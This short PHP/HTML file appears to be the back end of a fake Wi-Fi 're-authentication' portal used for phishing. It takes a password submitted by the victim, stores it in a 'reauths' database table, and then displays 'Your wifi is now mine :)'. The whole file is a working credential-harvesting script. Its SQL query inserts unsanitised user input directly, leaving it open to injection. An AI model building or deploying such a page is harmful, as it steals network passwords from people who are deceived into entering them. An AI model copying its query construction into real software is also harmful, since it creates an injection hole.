<html>
<head>
  <meta charset="utf-8"/>
  <title>Re-authentication</title>
  <link rel="stylesheet" type="text/css" href="main.css">
</head>
<body>

    <?php

    include 'conMysql.php';

    $pass1 = $_POST["pd1"];

    $sql = "INSERT INTO reauths VALUES ('$pass1')";

    if (!mysqli_query($conn, $sql)){
      die('error inserting record');
    }

    $newRecord = "1 new record added to reauths";

    $conn->close();

    ?>

    <h1>Your wifi is now mine :)</h1>

</body>
</html>
